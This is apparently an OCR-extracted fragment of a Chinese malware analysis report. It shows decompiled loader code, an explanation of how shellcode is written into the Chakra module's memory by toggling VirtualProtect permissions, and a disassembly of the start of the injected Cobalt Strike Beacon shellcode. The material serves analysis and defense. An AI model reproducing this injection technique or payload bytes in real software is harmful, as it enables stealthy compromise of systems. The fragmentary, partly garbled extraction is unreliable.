sub_1001A590(v4); // kernel32.dll \n\n267 v238 = getFunAdd(v5, v174); // WriteFile \n\n268 v250 = 0; \n\n269 v249 = 0; \n\n270 v6 = sub_100078A0(v181); \n\n271 v175 = sub_1001A530(v6); \n\n272 v7 = sub_100077C0(v177); \n\n273 v8 = sub_1001A550(v7); \n\n274 v212 = getFunAdd(v8, v175); // ReadFile \n\n275 v9 = byte_100E1AC6;\n\n<--- Page Split --->\n\n获取Chakra.JsProjectWinRTNamespace函数的存，并通过VirtualProtect更改其属性为读写权限  \n\n![](images/6_0.jpg)\n  \n\n随后将Shellcode写入该内存，再次通过VirtualProtect更改其属性为可执行  \n\n![](images/6_1.jpg)\n  \n\n最终内存中加载的有效负载仍为Cobalt Strike Beacon\n\n<--- Page Split --->\n\n\n<table><tr><td>69948201</td><td>90</td><td>nop</td><td></td><td></td><td></td><td></td><td></td></tr><tr><td>69948202</td><td>90</td><td>nop</td><td></td><td></td><td></td><td></td><td></td></tr></table><br><br><table><tr><td>69948203</td><td>90</td><td>nop</td><td></td><td></td><td></td><td></td><td></td></tr><tr><td>69948204</td><td>90</td><td>nop</td><td></td><td></td><td></td><td></td><td></td></tr></table><br><br><table><tr><td>69948205</td><td>90</td><td>nop</td><td></td><td></td><td></td><td></td><td></td></tr><tr><td>69948206</td><td>90</td><td>nop</td><td></td><td></td><td></td><td></td><td></td></tr></table><br><br><table><tr><td>69948207</td><td>90</td><td>nop</td><td></td><td></td><td></td><td></td><td></td></tr><tr><td>69948208</td><td>90</td><td>nop</td><td></td><td></td><td></td><td></td><td></td></tr></table><br><br><table><tr><td>69948209</td><td>40</td><td>dec ebp</td><td></td><td></td><td></td><td></td><td></td></tr><tr><td>6994820A</td><td>5A</td><td>pop edx</td><td></td><td></td><td></td><td></td><td></td></tr><tr><td>6994820B</td><td>52</td><td>push edx</td><td></td><td></td><td></td><td></td><td></td></tr><tr><td>6994820C</td><td>45</td><td>inc ebp</td><td></td><td></td><td></td><td></td><td></td></tr><tr><td>6994820D</td><td>E8 00000000</td><td>call chakra.69948212</td><td></td><td></td><td></td><td></td><td>call s0</td></tr><tr><td>69948212</td><td>5B</td><td>pop ebx</td><td></td><td></td><td></td><td></td><td></td></tr><tr><td>69948213</td><td>89DF</td><td>mov edi,ebx</td><td></td><td></td><td></td><td></td><td></td></tr><tr><td>69948215</td><td>55</td><td>push ebp</td><td></td><td></td><td></td><td></td><td></td></tr><tr><td>69948216</td><td>89E5</td><td>mov ebp,esp</td><td></td><td></td><td></td><td></td><td></td></tr><tr><td>69948218</td><td>81C3 87C00000</td><td>add ebx,9CB7</td><td></td><td></td><td></td><td></td><td></td></tr><tr><td>6994821E</td><td>FFD3</td><td>call ebx</td><td></td><td></td><td></td><td></td><td></td></tr><tr><td>69948220</td><td>68 F0B5A256</td><td>push 56A2B5F0</td><td></td><td></td><td></td><td></td><td></td></tr><tr><td>69948225</td><td>68 04000000</td><td>push 4</td><td></td><td></td><td></td><td></td><td></td></tr><tr><td>6994822A</td><td>57</td><td>push edi</td><td></td><td></td><td></td><td></td><td></td></tr><tr><td>6994822B</td><td>FFD0</td><td>call eax</td><td></td><td></td><td></td><td></td><td></td></tr><tr><td>6994822D</td><td>0000</td><td>add byte ptr ds:[eax],al</td><td></td><td></td><td></td><td></td><td></td></tr><tr><td>6994822F</td><td>0000</td><td>add byte ptr ds:[eax],al</td><td></td><td></td><td></td><td></td><td></td></tr><tr><td>69948231</td><td>0000</td><td>add byte ptr ds:[eax],al</td><td></td><td></td><td></td><td></td><td></td><td></td></tr><tr><td>69948233</td><td>0000</td><td>add byte ptr ds:[eax],al</td><td></td><td></td><td></td><td></td><td></td><td></td></tr><tr><td>69948235</td><td>0000</td><td>add byte ptr ds:[eax],al</td><td></td><td></td><td></td><td></td><td></td><td></td></tr></table>\n\n4", "format_code": "v238=getFunAdd(v5,v174);v212=getFunAdd(v8,v175);", "hash_code": "7c490f27b512c89641df0c2201964bd8c81c78409746c5799fd8b2c0051b453d", "hash": "hash"}
